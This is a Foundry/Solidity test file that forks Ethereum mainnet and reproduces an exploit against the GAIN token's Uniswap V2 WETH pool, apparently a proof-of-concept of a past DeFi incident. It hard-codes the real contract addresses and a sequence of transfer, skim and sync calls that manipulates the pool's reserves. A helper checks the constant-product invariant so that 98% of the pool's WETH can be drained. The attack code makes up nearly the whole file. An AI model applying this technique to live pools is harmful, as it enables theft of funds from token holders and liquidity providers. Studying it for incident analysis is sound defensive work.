// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IWETH9.sol";
import "@interface/IUniswapV2.sol";
import "@interface/IUniswapV3.sol";

import "./IGAIN.sol";

WETH9 constant WETH = WETH9(
    payable(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2))
);
IGAIN constant GAIN = IGAIN(
    payable(0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac)
);
IUniswapV3Pool constant univ3USDT = IUniswapV3Pool(
    0xc7bBeC68d12a0d1830360F8Ec58fA599bA1b0e9b
);
IUniswapV2Pair constant WETH_GAIN_Pool = IUniswapV2Pair(
    0x31d80EA33271891986D873B397d849A92EF49255
);
IUniswapV2Router constant UNISWAP_V2_ROUTER = IUniswapV2Router(
    0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
);

contract GainTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 19277620 - 1);

        vm.label(address(WETH), "WETH");
        vm.label(address(WETH_GAIN_Pool), "Uniswap V2: GAIN");

        deal(address(WETH), address(this), 0.1 ether);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() external {
        // uint256 totalSupply = GAIN.totalSupply();
        // console.log(totalSupply);

        // string memory sideGiven = GAIN._children_of_gainos(address(this));
        // console.log(sideGiven);

        WETH.transfer(address(WETH_GAIN_Pool), 0.1 ether);
        WETH_GAIN_Pool.swap(0, 10000000000, address(this), "");

        // sideGiven = GAIN._children_of_gainos(address(this));
        // console.log(sideGiven);

        GAIN.transfer(address(WETH_GAIN_Pool), 100);
        WETH_GAIN_Pool.skim(address(this));
        WETH_GAIN_Pool.sync();

        GAIN.transfer(address(WETH_GAIN_Pool), 189);
        WETH_GAIN_Pool.skim(address(this));
        WETH_GAIN_Pool.sync();

        // print("GAIN", GAIN.balanceOf(address(this)), 5);
        print("GAIN", GAIN.balanceOf(address(this)), 5);
        GAIN.transfer(address(WETH_GAIN_Pool), 100000000000000);
        calcK();

        // print("GAIN", GAIN.balanceOf(address(this)), 5);
        // WETH_GAIN_Pool.sync();
    }

    function calcK() public {
        (uint112 r0, uint112 r1, ) = WETH_GAIN_Pool.getReserves();
        uint256 b0 = WETH.balanceOf(address(WETH_GAIN_Pool));
        uint256 b1 = GAIN.balanceOf(address(WETH_GAIN_Pool));

        // 输出 98%的 WETH
        b0 = b0 - (b0 * 98) / 100;

        print("Pool's R0 WETH", r0, 18);
        print("Pool's R1 Gain", r1, 5);
        print("Pool's B0 WETH", b0, 18);
        print("Pool's B1 Gain", b1, 5);

        // Pool's R0 WETH: 6.598936314096593364
        // Pool's R1 Gain: 8168802593931168422.46651
        // Pool's B0 WETH: 0.131978726281931868
        // Pool's B1 Gain: 8168803316953206688.33648

        uint256 amount0In = 0;
        uint256 amount1In = b1 > r1 - 0 ? b1 - (r1 - 0) : 0;

        uint256 balance0Adjusted = (b0 * 1000) - (amount0In * 3);
        uint256 balance1Adjusted = (b1 * 1000) - (amount1In * 3);

        print("left_", balance0Adjusted * balance1Adjusted, 18);
        print("right", uint256(r0) * r1 * (1000 ** 2), 18);
        // left:  107810825673283381576225415463.011035508302812000
        // right: 5390540807977883544186408383022.075337823964000000
        // require(left > right, "K")
    }
}
